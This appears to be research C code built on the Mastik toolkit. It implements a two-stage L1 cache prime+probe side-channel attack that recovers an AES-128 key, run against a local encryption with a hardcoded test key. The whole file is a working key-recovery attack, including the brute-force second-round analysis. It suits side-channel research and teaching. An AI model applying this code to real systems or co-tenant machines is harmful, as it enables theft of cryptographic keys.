/*
 * Copyright 2021 The University of Adelaide
 *
 * This file is part of Mastik.
 *
 * Mastik is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mastik is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Mastik.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
#include "aes.h"
#include <math.h>


#include <mastik/util.h>
#include <mastik/synctrace.h>

#define AESSIZE 16
#define NSAMPLES 20000//采样条数，二阶攻击建议20w

//通过第一轮攻击得到的密钥高4位，需要手动更改值
static uint8_t key_high[16] ={
  0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7
};
//通过第一轮攻击得到的密钥高4位，需要手动更改值

typedef uint8_t aes_t[AESSIZE];

static uint8_t s_box[256] = {
	// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f
	0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, // 0
	0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, // 1
	0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, // 2
	0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, // 3
	0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, // 4
	0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, // 5
	0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, // 6
	0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, // 7
	0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, // 8
	0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, // 9
	0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, // a
	0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, // b
	0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, // c
	0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, // d
	0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, // e
	0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};// f

const uint8_t gf256_mul2[256] = {//gf256上的乘2查表
  0x00, 0x02, 0x04, 0x06, 0x08, 0x0A, 0x0C, 0x0E, 0x10, 0x12, 0x14, 0x16, 0x18, 0x1A, 0x1C, 0x1E,
  0x20, 0x22, 0x24, 0x26, 0x28, 0x2A, 0x2C, 0x2E, 0x30, 0x32, 0x34, 0x36, 0x38, 0x3A, 0x3C, 0x3E,
  0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x4E, 0x50, 0x52, 0x54, 0x56, 0x58, 0x5A, 0x5C, 0x5E,
  0x60, 0x62, 0x64, 0x66, 0x68, 0x6A, 0x6C, 0x6E, 0x70, 0x72, 0x74, 0x76, 0x78, 0x7A, 0x7C, 0x7E,
  0x80, 0x82, 0x84, 0x86, 0x88, 0x8A, 0x8C, 0x8E, 0x90, 0x92, 0x94, 0x96, 0x98, 0x9A, 0x9C, 0x9E,
  0xA0, 0xA2, 0xA4, 0xA6, 0xA8, 0xAA, 0xAC, 0xAE, 0xB0, 0xB2, 0xB4, 0xB6, 0xB8, 0xBA, 0xBC, 0xBE,
  0xC0, 0xC2, 0xC4, 0xC6, 0xC8, 0xCA, 0xCC, 0xCE, 0xD0, 0xD2, 0xD4, 0xD6, 0xD8, 0xDA, 0xDC, 0xDE,
  0xE0, 0xE2, 0xE4, 0xE6, 0xE8, 0xEA, 0xEC, 0xEE, 0xF0, 0xF2, 0xF4, 0xF6, 0xF8, 0xFA, 0xFC, 0xFE,
  0x1B, 0x19, 0x1F, 0x1D, 0x13, 0x11, 0x17, 0x15, 0x0B, 0x09, 0x0F, 0x0D, 0x03, 0x01, 0x07, 0x05,
  0x3B, 0x39, 0x3F, 0x3D, 0x33, 0x31, 0x37, 0x35, 0x2B, 0x29, 0x2F, 0x2D, 0x23, 0x21, 0x27, 0x25,
  0x5B, 0x59, 0x5F, 0x5D, 0x53, 0x51, 0x57, 0x55, 0x4B, 0x49, 0x4F, 0x4D, 0x43, 0x41, 0x47, 0x45,
  0x7B, 0x79, 0x7F, 0x7D, 0x73, 0x71, 0x77, 0x75, 0x6B, 0x69, 0x6F, 0x6D, 0x63, 0x61, 0x67, 0x65,
  0x9B, 0x99, 0x9F, 0x9D, 0x93, 0x91, 0x97, 0x95, 0x8B, 0x89, 0x8F, 0x8D, 0x83, 0x81, 0x87, 0x85,
  0xBB, 0xB9, 0xBF, 0xBD, 0xB3, 0xB1, 0xB7, 0xB5, 0xAB, 0xA9, 0xAF, 0xAD, 0xA3, 0xA1, 0xA7, 0xA5,
  0xDB, 0xD9, 0xDF, 0xDD, 0xD3, 0xD1, 0xD7, 0xD5, 0xCB, 0xC9, 0xCF, 0xCD, 0xC3, 0xC1, 0xC7, 0xC5,
  0xFB, 0xF9, 0xFF, 0xFD, 0xF3, 0xF1, 0xF7, 0xF5, 0xEB, 0xE9, 0xEF, 0xED, 0xE3, 0xE1, 0xE7, 0xE5
};

const uint8_t gf256_mul3[256] = {//gf256上的乘3查表
  0x00, 0x03, 0x06, 0x05, 0x0C, 0x0F, 0x0A, 0x09, 0x18, 0x1B, 0x1E, 0x1D, 0x14, 0x17, 0x12, 0x11,
  0x30, 0x33, 0x36, 0x35, 0x3C, 0x3F, 0x3A, 0x39, 0x28, 0x2B, 0x2E, 0x2D, 0x24, 0x27, 0x22, 0x21,
  0x60, 0x63, 0x66, 0x65, 0x6C, 0x6F, 0x6A, 0x69, 0x78, 0x7B, 0x7E, 0x7D, 0x74, 0x77, 0x72, 0x71,
  0x50, 0x53, 0x56, 0x55, 0x5C, 0x5F, 0x5A, 0x59, 0x48, 0x4B, 0x4E, 0x4D, 0x44, 0x47, 0x42, 0x41,
  0xC0, 0xC3, 0xC6, 0xC5, 0xCC, 0xCF, 0xCA, 0xC9, 0xD8, 0xDB, 0xDE, 0xDD, 0xD4, 0xD7, 0xD2, 0xD1,
  0xF0, 0xF3, 0xF6, 0xF5, 0xFC, 0xFF, 0xFA, 0xF9, 0xE8, 0xEB, 0xEE, 0xED, 0xE4, 0xE7, 0xE2, 0xE1,
  0xA0, 0xA3, 0xA6, 0xA5, 0xAC, 0xAF, 0xAA, 0xA9, 0xB8, 0xBB, 0xBE, 0xBD, 0xB4, 0xB7, 0xB2, 0xB1,
  0x90, 0x93, 0x96, 0x95, 0x9C, 0x9F, 0x9A, 0x99, 0x88, 0x8B, 0x8E, 0x8D, 0x84, 0x87, 0x82, 0x81,
  0x9B, 0x98, 0x9D, 0x9E, 0x97, 0x94, 0x91, 0x92, 0x83, 0x80, 0x85, 0x86, 0x8F, 0x8C, 0x89, 0x8A,
  0xAB, 0xA8, 0xAD, 0xAE, 0xA7, 0xA4, 0xA1, 0xA2, 0xB3, 0xB0, 0xB5, 0xB6, 0xBF, 0xBC, 0xB9, 0xBA,
  0xFB, 0xF8, 0xFD, 0xFE, 0xF7, 0xF4, 0xF1, 0xF2, 0xE3, 0xE0, 0xE5, 0xE6, 0xEF, 0xEC, 0xE9, 0xEA,
  0xCB, 0xC8, 0xCD, 0xCE, 0xC7, 0xC4, 0xC1, 0xC2, 0xD3, 0xD0, 0xD5, 0xD6, 0xDF, 0xDC, 0xD9, 0xDA,
  0x5B, 0x58, 0x5D, 0x5E, 0x57, 0x54, 0x51, 0x52, 0x43, 0x40, 0x45, 0x46, 0x4F, 0x4C, 0x49, 0x4A,
  0x6B, 0x68, 0x6D, 0x6E, 0x67, 0x64, 0x61, 0x62, 0x73, 0x70, 0x75, 0x76, 0x7F, 0x7C, 0x79, 0x7A,
  0x3B, 0x38, 0x3D, 0x3E, 0x37, 0x34, 0x31, 0x32, 0x23, 0x20, 0x25, 0x26, 0x2F, 0x2C, 0x29, 0x2A,
  0x0B, 0x08, 0x0D, 0x0E, 0x07, 0x04, 0x01, 0x02, 0x13, 0x10, 0x15, 0x16, 0x1F, 0x1C, 0x19, 0x1A
};
void usage(char *p) {
  fprintf(stderr, "Usage:\n./ST-L1PP-AES -1 \n./ST-L1PP-AES -2 -4 (k0_k5_k10_k15) \n./ST-L1PP-AES -2 -5 (k12_k1_k6_k11) \n./ST-L1PP-AES -2 -6 (k8_k13_k2_k7 ) \n./ST-L1PP-AES -2 -7 (k4_k9_k14_k3 ) \n");
  exit(1);
}

void tobinary(char *data, aes_t aes) {
  assert(strlen(data)==AESSIZE*2);
  unsigned int x;
  for (int i = 0; i < AESSIZE; i++) {
    sscanf(data+i*2, "%2x", &x);
    aes[i] = x;
  }
}

void grayspace(int64_t intensity, int64_t min, int64_t max, char c) {
  printf("\e[48;5;%ld;31;1m%c\e[0m", 232+((intensity - min) *24)/(max - min + 1), c);
}

int64_t display(int counts[256], int64_t data[256][1024], int guess, int offset) {
  int64_t min = INT64_MAX;
  int64_t max = INT64_MIN;
  for (int i = 0; i < 256; i++) 
    if (counts[i]) 
      for (int j = 0; j < L1_SETS; j++){
	if (min > data[i][j])
	  min = data[i][j];
	if (max < data[i][j])
	  max = data[i][j];
      }

  if (max == min)
    max++;
  for (int i = 0; i < 256; i++) {
    if (counts[i]) {
      printf("%02X. ", i);
      int set = (((i >> 4) ^ guess) + offset) % L1_SETS;
      if (offset < 0)
	set = -1;
      for (int j = 0; j < L1_SETS; j++) {
	grayspace(data[i][j], min, max, set == j ? '#' : ' ');
      }
      printf("\n");
    }
  }
}

void analyse(int64_t data[256][1024], int *key, int *offset) {
  int64_t max = INT64_MIN;
	
  for (int guess = 0; guess < 16; guess++) {
    for (int off = 0; off < L1_SETS; off++) {
      int64_t sum = 0LL;
      for (int pt = 0; pt < 16; pt++) {
	int set = (off + (pt ^ guess)) % L1_SETS;
	sum += data[pt << 4][set];
	//printf("%d,%d,%d,%d\n",off,pt<<4,set,sum);
      }
      if (sum > max) {
	max = sum;
	*key = guess;
	*offset = off;
      }
    }
  }
}

void crypto(uint8_t *input, uint8_t *output, void *data) {
  AES_KEY *aeskey = (AES_KEY *)data;
  AES_encrypt(input, output, aeskey);
}





uint8_t second_round_access_0(uint8_t p0,uint8_t p5,uint8_t p10,uint8_t p15, uint8_t k0, uint8_t k5, uint8_t k10, uint8_t k15);
uint8_t second_round_access_1(uint8_t p12,uint8_t p1,uint8_t p6,uint8_t p11, uint8_t k12, uint8_t k1, uint8_t k6, uint8_t k11);
uint8_t second_round_access_2(uint8_t p8,uint8_t p13,uint8_t p2,uint8_t p7, uint8_t k8, uint8_t k13, uint8_t k2, uint8_t k7);
uint8_t second_round_access_3(uint8_t p4,uint8_t p9,uint8_t p14,uint8_t p3, uint8_t k4, uint8_t k9, uint8_t k14, uint8_t k3);

/*
records[64]:

uint8_t  records.plaintext[16]
uint16_t records.cache_times[64]
额外加入的结构体
*/



void attack_second_round(st_encryption_record_t *records, int guess_position) {

  double baseline[L1_SETS] = {0};
  for (int set = 0; set < L1_SETS; set++) {
    for (int i = 0; i < NSAMPLES; i++) {
      baseline[set] += records[i].cache_times[set];
    }
    baseline[set] /= NSAMPLES;//为归一化做准备，算出cache每个位置的平均访问时间
  }

  int best_offset = 0;//offset,0~63
  uint8_t best_ka_low = 0, best_kb_low = 0, best_kc_low = 0, best_kd_low = 0;//4个key的低4位猜测值
  double best_total_score = 0.0;//最高的得分（最长的cahce访问时间）值
  uint8_t ka_full, kb_full, kc_full, kd_full;

  for (int offset_guess = 0; offset_guess < L1_SETS; offset_guess++) {
  for (uint8_t ka_low_guess = 0; ka_low_guess < 16; ka_low_guess++) {
  for (uint8_t kb_low_guess = 0; kb_low_guess < 16; kb_low_guess++) {
  for (uint8_t kc_low_guess = 0; kc_low_guess < 16; kc_low_guess++) {
  for (uint8_t kd_low_guess = 0; kd_low_guess < 16; kd_low_guess++) {
    double candidate_total_score =0.0;
    for (size_t i = 0; i < NSAMPLES; i++) {
      uint8_t guess;
      //猜测哪一组(k0_k5_k10_k15 / k12_k1_k6_k11 / k8_k13_k2_k7 / k4_k9_k14_k3 )
      if(guess_position == 0){
        ka_full = (uint8_t)(key_high[0 ] << 4) | ka_low_guess;
        kb_full = (uint8_t)(key_high[5 ] << 4) | kb_low_guess;
        kc_full = (uint8_t)(key_high[10] << 4) | kc_low_guess;
        kd_full = (uint8_t)(key_high[15] << 4) | kd_low_guess;
        guess = second_round_access_0(
        records[i].plaintext[0],records[i].plaintext[5],records[i].plaintext[10],records[i].plaintext[15], 
        ka_full, kb_full, kc_full, kd_full
        );//获取guees_index
      }else if(guess_position == 1){
        ka_full = (uint8_t)(key_high[12] << 4) | ka_low_guess;
        kb_full = (uint8_t)(key_high[1 ] << 4) | kb_low_guess;
        kc_full = (uint8_t)(key_high[6 ] << 4) | kc_low_guess;
        kd_full = (uint8_t)(key_high[11] << 4) | kd_low_guess;
        guess = second_round_access_1(
        records[i].plaintext[12],records[i].plaintext[1],records[i].plaintext[6],records[i].plaintext[11], 
        ka_full, kb_full, kc_full, kd_full
        );
      }else if(guess_position == 2){
        ka_full = (uint8_t)(key_high[8 ] << 4) | ka_low_guess;
        kb_full = (uint8_t)(key_high[13] << 4) | kb_low_guess;
        kc_full = (uint8_t)(key_high[2 ] << 4) | kc_low_guess;
        kd_full = (uint8_t)(key_high[7 ] << 4) | kd_low_guess;
        guess = second_round_access_2(
        records[i].plaintext[8],records[i].plaintext[13],records[i].plaintext[2],records[i].plaintext[7 ], 
        ka_full, kb_full, kc_full, kd_full
        );
      }else if(guess_position == 3){
        ka_full = (uint8_t)(key_high[4 ] << 4) | ka_low_guess;
        kb_full = (uint8_t)(key_high[9 ] << 4) | kb_low_guess;
        kc_full = (uint8_t)(key_high[14] << 4) | kc_low_guess;
        kd_full = (uint8_t)(key_high[3 ] << 4) | kd_low_guess;
        guess = second_round_access_3(
        records[i].plaintext[4],records[i].plaintext[9],records[i].plaintext[14],records[i].plaintext[3 ], 
        ka_full, kb_full, kc_full, kd_full
        );
      }

      uint8_t predicted_index = (guess >> 4) & 0x0F; //获取猜测值高4位
      uint8_t guess_index = (predicted_index + offset_guess) % L1_SETS;//加上offset
      double candidate_score = records[i].cache_times[guess_index] - baseline[guess_index];
      //printf("%f\n",candidate_score);
      candidate_total_score += candidate_score;
    }//0~N_SAMPLES-1遍历结束

    if (candidate_total_score > best_total_score) {//更新为成绩最好的猜测值
    best_total_score = candidate_total_score;
    best_offset = offset_guess;
    best_ka_low = ka_low_guess;
    best_kb_low = kb_low_guess;
    best_kc_low = kc_low_guess;
    best_kd_low = kd_low_guess;
    }

  }}}}//4个4bit_key_low的穷举结束
  printf("%d,%d,%d,%d\n",best_ka_low,best_kb_low,best_kc_low,best_kd_low);
  printf("Processed offset %d. %d/%d, current best score: %f\n", 
          offset_guess, (offset_guess+1), 64, best_total_score);
  }//0~63的offset穷举结束

  //输出结果
  
  printf("offset:%d\n", best_offset);
  if(guess_position == 0){
    printf("k0 , k5 , k10, k15\n");
    ka_full = (uint8_t)(key_high[0 ] << 4) | best_ka_low;
    kb_full = (uint8_t)(key_high[5 ] << 4) | best_kb_low;
    kc_full = (uint8_t)(key_high[10] << 4) | best_kc_low;
    kd_full = (uint8_t)(key_high[15] << 4) | best_kd_low;
  }else if(guess_position == 1){
    printf("k12, k1 , k6 , k11\n");
    ka_full = (uint8_t)(key_high[12] << 4) | best_ka_low;
    kb_full = (uint8_t)(key_high[1 ] << 4) | best_kb_low;
    kc_full = (uint8_t)(key_high[6 ] << 4) | best_kc_low;
    kd_full = (uint8_t)(key_high[11] << 4) | best_kd_low;
  }else if(guess_position == 2){
    printf("k8 , k13, k2 , k7 \n");
    ka_full = (uint8_t)(key_high[8 ] << 4) | best_ka_low;
    kb_full = (uint8_t)(key_high[13] << 4) | best_kb_low;
    kc_full = (uint8_t)(key_high[2 ] << 4) | best_kc_low;
    kd_full = (uint8_t)(key_high[7 ] << 4) | best_kd_low;
  }else if(guess_position == 3){
    printf("k4 , k9 , k14, k3 \n");
    ka_full = (uint8_t)(key_high[4 ] << 4) | best_ka_low;
    kb_full = (uint8_t)(key_high[9 ] << 4) | best_kb_low;
    kc_full = (uint8_t)(key_high[14] << 4) | best_kc_low;
    kd_full = (uint8_t)(key_high[3 ] << 4) | best_kd_low;
  }
  printf("%-3x ,%-3x ,%-3x ,%-3x",
  ka_full,kb_full,kc_full,kd_full);
  printf("total time:%f\n", best_total_score);




}

uint8_t second_round_access_0(uint8_t p0,uint8_t p5,uint8_t p10,uint8_t p15, uint8_t k0, uint8_t k5, uint8_t k10, uint8_t k15) {
  //s(p0 ⊕ k0) ⊕ s(p5 ⊕ k5) ⊕ 2 • s(p10 ⊕ k10) ⊕ 3 • s(p15 ⊕ k15) ⊕ s(k15) ⊕ k2
  uint8_t s0 = s_box[p0 ^ k0];
  uint8_t s5 = s_box[p5 ^ k5];
  uint8_t s10 = s_box[p10 ^ k10];
  uint8_t s15 = s_box[p15 ^ k15];
  uint8_t s10_mul2 = gf256_mul2[s10];
  uint8_t s15_mul3 = gf256_mul3[s15];

  uint8_t result = s0 ^ s5 ^ s10_mul2 ^ s15_mul3 ^ s_box[k15] 
  ^ (key_high[2]<<4);//get high nibble of k2
  return result;
}

uint8_t second_round_access_1(uint8_t p12,uint8_t p1,uint8_t p6,uint8_t p11, uint8_t k12, uint8_t k1, uint8_t k6, uint8_t k11){
  //3 • s(p12 ⊕ k12) ⊕ s(p1 ⊕ k1) ⊕ s(p6 ⊕ k6) ⊕ 2 • s(p11 ⊕ k11) ⊕ s(k12) ⊕ k15 ⊕ k3 ⊕ k7 ⊕ k11
  uint8_t s12 = s_box[p12 ^ k12];
  uint8_t s1 = s_box[p1 ^ k1];
  uint8_t s6 = s_box[p6 ^ k6];
  uint8_t s11 = s_box[p11 ^ k11];
  uint8_t s11_mul2 = gf256_mul2[s11];
  uint8_t s12_mul3 = gf256_mul3[s12];

  uint8_t result = s12_mul3 ^ s1 ^ s6 ^ s11_mul2 ^ s_box[k12]  
  ^ (key_high[15]<<4) ^ (key_high[3]<<4) ^ (key_high[7]<<4) ^ (key_high[11]<<4);
  return result;
}
uint8_t second_round_access_2(uint8_t p8,uint8_t p13,uint8_t p2,uint8_t p7, uint8_t k8, uint8_t k13, uint8_t k2, uint8_t k7){
  // 2 • (p8 ⊕ k8) ⊕ 3 • s(p13 ⊕ k13) ⊕ s(p2 ⊕ k2) ⊕ s(p7 ⊕ k7) ⊕ s(k13) ⊕ k0 ⊕ k4 ⊕ k8 ⊕ 1
  uint8_t s8 = s_box[p8 ^ k8];
  uint8_t s13 = s_box[p13 ^ k13];
  uint8_t s2 = s_box[p2 ^ k2];
  uint8_t s7 = s_box[p7 ^ k7];
  uint8_t s8_mul2 = gf256_mul2[s8];
  uint8_t s13_mul3 = gf256_mul3[s13];

  uint8_t result = s8_mul2 ^ s13_mul3 ^ s2 ^ s7 ^ s_box[k13] 
  ^ (key_high[0]<<4) ^ (key_high[4]<<4) ^ (key_high[8]<<4);
  //不需要^1，因为我们只关注result的高4位
  return result;
}
uint8_t second_round_access_3(uint8_t p4,uint8_t p9,uint8_t p14,uint8_t p3, uint8_t k4, uint8_t k9, uint8_t k14, uint8_t k3){
  //s(p4 ⊕ k4) ⊕ 2 • s(p9 ⊕ k9) ⊕ 3 • s(p14 ⊕ k14) ⊕ s(p3 ⊕ k3) ⊕ s(k14) ⊕ k1 ⊕ k5
  uint8_t s4 = s_box[p4 ^ k4];
  uint8_t s9 = s_box[p9 ^ k9];
  uint8_t s14 = s_box[p14 ^ k14];
  uint8_t s3 = s_box[p3 ^ k3];
  uint8_t s9_mul2 = gf256_mul2[s9];
  uint8_t s14_mul3 = gf256_mul3[s14];

  uint8_t result = s4 ^ s9_mul2 ^ s14_mul3 ^ s3 ^ s_box[k14] 
  ^ (key_high[1]<<4) ^ (key_high[5]<<4);
  return result;
}



int main(int ac, char **av) {
  int samples = NSAMPLES;
  int round = 1;
  int analysis = 1;
  int heatmap = 1;
  int byte = 0;
  int guess_position = 0;//猜测哪一组(k0_k5_k10_k15 / k12_k1_k6_k11 / k8_k13_k2_k7 / k4_k9_k14_k3 )
  int ch;
  while ((ch = getopt(ac, av, "b:s:12aAhH4567")) != -1) {
    switch (ch){
      case 's':
	samples = atoi(optarg);
	break;
      case '1':
	round = 1;
	break;
      case '2':
	round = 2;
	break;
      case 'a':
	analysis = 1;
	break;
      case 'A':
	analysis = 0;
	break;
      case 'h':
	heatmap = 1;
	break;
      case 'H':
	heatmap = 0;
	break;
      case 'b':
	byte = atoi(optarg);
	break;
//猜测哪一组(k0_k5_k10_k15 / k12_k1_k6_k11 / k8_k13_k2_k7 / k4_k9_k14_k3 )
      case '4'://猜测k0_k5_k10_k15
  guess_position = 0;
  printf("k0_k5_k10_k15\n");
	break;
      case '5'://k12_k1_k6_k11
  guess_position = 1;
  printf("k12_k1_k6_k11\n");
	break;
      case '6'://猜测k8_k13_k2_k7
  guess_position = 2;
  printf("k8_k13_k2_k7\n");
	break;
      case '7'://猜测k4_k9_k14_k3
  guess_position = 3;
  printf("k4_k9_k14_k3\n");
	break;

      default:
	usage(av[0]);
    }
  }

  if (round == 2)
    analysis = 0;
  if (!analysis && !heatmap) {
    fprintf(stderr, "No output format specified\n");
    usage(av[0]);
  }
  if (samples <= 0) {
    fprintf(stderr, "Negative number of samples\n");
    usage(av[0]);
  }
  if (byte < 0 || byte >= AESSIZE) {
    fprintf(stderr, "Target byte must be in the range 0--15\n");
    usage(av[0]);
  }


  aes_t key;
  char * keystr = "00112233445566770011223344556677";
  tobinary(keystr, key);
  AES_KEY aeskey;
  private_AES_set_encrypt_key(key, 128, &aeskey);

  delayloop(1000000000);

  st_encryption_record_t *records = NULL;
  int record_count = NSAMPLES;

  if (round == 1) {
    st_clusters_t clusters = syncPrimeProbe(samples,
				  AESSIZE,
				  1,
				  NULL,
				  NULL,
				  crypto,
				  &aeskey,
				  0xf0,
          1,
         &records, &record_count);
          
  for (int idx=0;idx<256;idx++){
    //("%d\n",clusters->count[idx]);
  }
  
    for (int i = 0; i < 16; i++) {
      int key, offset;
      printf("Key byte %2d", i);
      if (analysis) {
	analyse(clusters[i].avg, &key, &offset);
	printf(" Guess:%1x-\n", key);
      } else {
	offset = -L1_SETS;
	printf("\n");
      }
      if (heatmap) {
	display(clusters[i].count, clusters[i].avg, key, offset);
	printf("\n");
      }
    }
    free(clusters);
  } else if (round == 2) {


  aes_t fixmask, fixdata;
  tobinary("00000000000000000000000000000000", fixmask);
  tobinary("00000000000000000000000000000000", fixdata);
  //fix的是明文而不是密钥


  
  

  st_clusters_t clusters = syncPrimeProbe(samples,
    AESSIZE,
    1,
    fixmask,
    fixdata,
    crypto,
    &aeskey,
    0xff,
    1,
  &records, &record_count);



  attack_second_round(records,guess_position);

  free(records);
  free(clusters);
  }
}

